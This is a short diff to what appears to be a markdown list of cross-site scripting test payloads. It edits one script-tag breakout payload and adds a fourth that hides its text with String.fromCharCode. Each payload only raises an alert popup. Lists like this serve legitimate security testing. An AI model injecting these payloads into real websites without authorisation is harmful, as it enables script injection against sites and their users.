@@ -1,6 +1,6 @@
 > type 1
 ```
-"><script>alert('XSS-Hacker')</script>
+"><script>alert(1)</script>
 ```
 
 > type 2
@@ -11,5 +11,10 @@
 > type 3
 ```
 javascript:alert('XSS-Hacker')
+```
+
+> type 4
+```
+<script>alert(String.fromCharCode(88,83,83))</script>
 ```
 
